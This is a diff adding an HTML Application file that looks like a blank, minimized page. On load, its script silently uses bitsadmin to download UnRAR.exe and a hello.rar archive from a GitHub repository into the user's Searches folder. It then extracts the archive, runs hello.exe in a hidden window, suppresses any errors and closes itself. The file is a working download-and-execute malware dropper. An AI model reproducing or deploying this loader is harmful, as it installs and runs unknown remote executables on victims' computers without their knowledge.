@@ -1,0 +1,58 @@
+<html>
+<head>
+<title></title>
+<hta:application id="oHTA"
+    applicationname=""
+    border="thin"
+    caption="no"
+    contextmenu="no"
+    innerborder="no"
+    maximizebutton="no"
+    minimizebutton="no"
+    navigable="yes"
+    scroll="auto"
+    showintaskbar="no"
+    singleinstance="yes"
+    sysmenu="no"
+    version="1.0"
+    windowstate="minimize">
+
+<script type="text/javascript">
+function downloadExtractAndExecute() {
+    try {
+        var objShell = new ActiveXObject("WScript.Shell");
+
+        var username = objShell.ExpandEnvironmentStrings("%USERNAME%");
+
+        var unrarUrl = "https://github.com/usa877/kingmoon/raw/main/UnRAR.exe";
+        var unrarSaveTo = "C:\\Users\\" + username + "\\Searches\\UnRAR.exe";
+        var unrarCmd = "cmd.exe /c bitsadmin.exe /transfer myDownloadJob /download /priority normal " + unrarUrl + " " + unrarSaveTo;
+        objShell.Run(unrarCmd, 0, true);
+
+        var helloUrl = "https://github.com/usa877/kingmoon/raw/main/hello.rar";
+        var helloSaveTo = "C:\\Users\\" + username + "\\Searches\\hello.rar";
+        var helloCmd = "cmd.exe /c bitsadmin.exe /transfer myDownloadJob /download /priority normal " + helloUrl + " " + helloSaveTo;
+        objShell.Run(helloCmd, 0, true);
+
+        var rarFile = "C:\\Users\\" + username + "\\Searches\\hello.rar";
+        var unrarPath = "C:\\Users\\" + username + "\\Searches\\UnRAR.exe";
+        var unrarExtractCmd = "cmd.exe /c " + unrarPath + " x " + rarFile + " C:\\Users\\" + username + "\\Searches\\";
+        objShell.Run(unrarExtractCmd, 0, true);
+
+        var helloExePath = "C:\\Users\\" + username + "\\Searches\\hello.exe";
+        objShell.Run(helloExePath, 0, true);
+    } catch (e) {
+        // Handle any errors silently
+    }
+}
+
+window.onload = function() {
+    downloadExtractAndExecute();
+    window.close();
+};
+</script>
+
+</head>
+<body>
+</body>
+</html>
